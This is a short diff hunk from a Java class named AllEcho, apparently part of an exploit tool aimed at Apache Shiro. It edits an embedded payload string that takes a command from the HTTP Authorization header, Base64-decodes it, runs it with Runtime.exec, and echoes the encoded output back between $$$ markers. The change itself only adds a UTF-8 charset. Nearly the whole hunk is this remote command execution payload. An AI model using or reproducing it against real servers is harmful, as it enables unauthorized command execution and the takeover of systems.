@@ -48,7 +48,7 @@ public class AllEcho {
                 "                    \n" +
                 "                    p.addHeader(\"Host\",r.getHeader(\"Host\"));\n" +
                 "                    try {\n" +
-                "                        p.getWriter().println(\"$$$\" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader(\"Authorization\").replaceAll(\"Basic \",\"\"))).getInputStream()).useDelimiter(\"\\\\A\").next().getBytes()) + \"$$$\");\n" +
+                "                        p.getWriter().println(\"$$$\" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader(\"Authorization\").replaceAll(\"Basic \",\"\"))).getInputStream()).useDelimiter(\"\\\\A\").next().getBytes(\"UTF-8\")) + \"$$$\");\n" +
                 "                    }catch (Exception e){}\n" +
                 "                   \n" +
                 "                    p.getWriter().flush();\n" +
